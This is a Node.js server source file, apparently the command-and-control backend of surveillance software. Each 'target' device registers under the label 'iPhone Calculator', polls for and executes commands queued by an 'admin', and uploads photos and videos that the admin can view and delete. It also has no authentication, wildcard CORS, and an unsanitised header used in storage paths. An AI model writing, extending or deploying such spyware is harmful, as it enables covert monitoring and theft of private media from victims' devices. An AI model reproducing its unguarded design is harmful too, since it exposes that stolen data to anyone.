const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  },
  maxHttpBufferSize: 1e8 // 100 MB buffer
});

const PORT = process.env.PORT || 7000;
const STORAGE_DIR = path.join(__dirname, 'storage');
const DB_FILE = path.join(__dirname, 'data.json');

// Ensure directories exist
if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });

function loadDB() {
  if (fs.existsSync(DB_FILE)) {
    try {
      return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
    } catch (e) {
      console.error('Error reading DB:', e);
    }
  }
  return { pairs: {}, media: [] };
}

function saveDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

let db = loadDB();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/storage', express.static(STORAGE_DIR));

// Configure Multer
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const pairCode = req.headers['x-pairing-code'] || 'default';
    const pairDir = path.join(STORAGE_DIR, pairCode);
    if (!fs.existsSync(pairDir)) fs.mkdirSync(pairDir, { recursive: true });
    cb(null, pairDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname) || (file.mimetype.includes('video') ? '.mp4' : '.jpg');
    cb(null, file.fieldname + '-' + uniqueSuffix + ext);
  }
});
const upload = multer({
  storage,
  limits: { fileSize: 500 * 1024 * 1024 }
});

// In-memory state
// pairingCode -> { socketId, lastSeen, stats }
const targetRegistry = new Map();
const commandQueues = new Map(); // pairingCode -> Array of pending commands

function isTargetActive(code) {
  if (!code) return false;
  const target = targetRegistry.get(code);
  if (!target) return false;
  // Active if seen in the last 15 seconds or socket connected
  return (Date.now() - target.lastSeen) < 15000;
}

// --- API Routes ---

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', port: PORT, time: new Date().toISOString() });
});

// Heartbeat & Check endpoint for both Target and Admin
app.post('/api/pair/check', (req, res) => {
  const code = (req.body.code || '').trim().toUpperCase();
  if (!code) return res.status(400).json({ error: 'Pairing code required' });

  // If this request came from target with device info or stats
  if (req.body.device || req.body.stats) {
    targetRegistry.set(code, {
      lastSeen: Date.now(),
      stats: req.body.stats || null,
      device: req.body.device || 'iPhone Calculator'
    });

    console.log(`[Target Heartbeat HTTP] Code: ${code}, Stats:`, req.body.stats);

    // Broadcast to Admin
    io.to(`room_${code}`).emit('target:status', {
      isOnline: true,
      stats: req.body.stats || null
    });
  }

  const online = isTargetActive(code);
  const targetData = targetRegistry.get(code);
  const mediaCount = db.media.filter(m => m.pairingCode === code).length;

  res.json({
    code,
    isTargetOnline: online,
    stats: targetData ? targetData.stats : null,
    mediaCount
  });
});

// Command queue for target polling
app.get('/api/commands', (req, res) => {
  const code = (req.query.code || '').trim().toUpperCase();
  if (!code) return res.status(400).json({ error: 'Code required' });

  // Target contacted server -> mark active
  const existing = targetRegistry.get(code) || {};
  targetRegistry.set(code, {
    ...existing,
    lastSeen: Date.now()
  });

  io.to(`room_${code}`).emit('target:status', { isOnline: true });

  const queue = commandQueues.get(code) || [];
  if (queue.length > 0) {
    const nextCmd = queue.shift();
    return res.json({ hasCommand: true, command: nextCmd });
  }
  res.json({ hasCommand: false });
});

app.post('/api/commands', (req, res) => {
  const code = (req.body.code || '').trim().toUpperCase();
  const command = req.body.command;
  if (!code || !command) return res.status(400).json({ error: 'Code and command required' });

  if (!commandQueues.has(code)) commandQueues.set(code, []);
  commandQueues.get(code).push(command);

  // Also emit via socket if target has active socket
  const target = targetRegistry.get(code);
  if (target && target.socketId) {
    io.to(target.socketId).emit('target:execute', command);
  }

  res.json({ success: true, queued: true });
});

// Upload media from target
app.post('/api/upload', upload.single('media'), (req, res) => {
  const pairingCode = (req.headers['x-pairing-code'] || '').trim().toUpperCase();
  if (!pairingCode) return res.status(400).json({ error: 'x-pairing-code header required' });
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });

  const mediaEntry = {
    id: path.basename(req.file.filename, path.extname(req.file.filename)),
    pairingCode,
    filename: req.file.filename,
    originalName: req.file.originalname,
    mimeType: req.file.mimetype,
    size: req.file.size,
    type: req.file.mimetype.includes('video') ? 'video' : 'photo',
    url: `/storage/${pairingCode}/${req.file.filename}`,
    createdAt: new Date().toISOString()
  };

  db.media.push(mediaEntry);
  saveDB(db);

  io.to(`room_${pairingCode}`).emit('admin:new_media', mediaEntry);
  res.json({ success: true, media: mediaEntry });
});

// List media
app.get('/api/media', (req, res) => {
  const pairingCode = (req.headers['x-pairing-code'] || req.query.code || '').trim().toUpperCase();
  if (!pairingCode) return res.status(400).json({ error: 'Pairing code required' });

  const items = db.media
    .filter(m => m.pairingCode === pairingCode)
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  res.json({ count: items.length, items });
});

// Delete media
app.delete('/api/media/:filename', (req, res) => {
  const pairingCode = (req.headers['x-pairing-code'] || req.query.code || '').trim().toUpperCase();
  const { filename } = req.params;

  const idx = db.media.findIndex(m => m.pairingCode === pairingCode && m.filename === filename);
  if (idx === -1) return res.status(404).json({ error: 'Media not found' });

  const filePath = path.join(STORAGE_DIR, pairingCode, filename);
  if (fs.existsSync(filePath)) {
    try { fs.unlinkSync(filePath); } catch (e) { console.error('Unlink error:', e); }
  }

  db.media.splice(idx, 1);
  saveDB(db);

  io.to(`room_${pairingCode}`).emit('admin:media_deleted', { filename });
  res.json({ success: true });
});

// --- Socket.IO ---
io.on('connection', (socket) => {
  // Target registers via socket
  socket.on('target:register', (data) => {
    const code = (data.code || '').trim().toUpperCase();
    if (!code) return;

    socket.pairingCode = code;
    socket.role = 'target';
    targetRegistry.set(code, {
      socketId: socket.id,
      lastSeen: Date.now(),
      stats: data.stats || null,
      device: data.device || 'iPhone Calculator'
    });
    socket.join(`room_${code}`);

    io.to(`room_${code}`).emit('target:status', {
      isOnline: true,
      stats: data.stats || null
    });
  });

  // Admin connects
  socket.on('admin:connect', (data) => {
    const code = (data.code || '').trim().toUpperCase();
    if (!code) return;

    socket.pairingCode = code;
    socket.role = 'admin';
    socket.join(`room_${code}`);

    const online = isTargetActive(code);
    const target = targetRegistry.get(code);

    socket.emit('target:status', {
      isOnline: online,
      stats: target ? target.stats : null
    });

    if (target && target.socketId) {
      io.to(target.socketId).emit('target:request_stats');
    }
  });

  // Admin sends command
  socket.on('admin:command', (data) => {
    const code = socket.pairingCode;
    if (!code) return;

    console.log(`[Admin Command to Target] Code: ${code}, Action:`, data);

    if (!commandQueues.has(code)) commandQueues.set(code, []);
    commandQueues.get(code).push(data);

    const target = targetRegistry.get(code);
    if (target && target.socketId) {
      io.to(target.socketId).emit('target:execute', data);
    }
  });

  socket.on('disconnect', () => {
    // If target disconnected socket, don't mark offline immediately (polling might still be active)
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`===============================================`);
  console.log(`  GALLERY VAULT SERVER IS RUNNING ON PORT ${PORT}  `);
  console.log(`===============================================`);
});
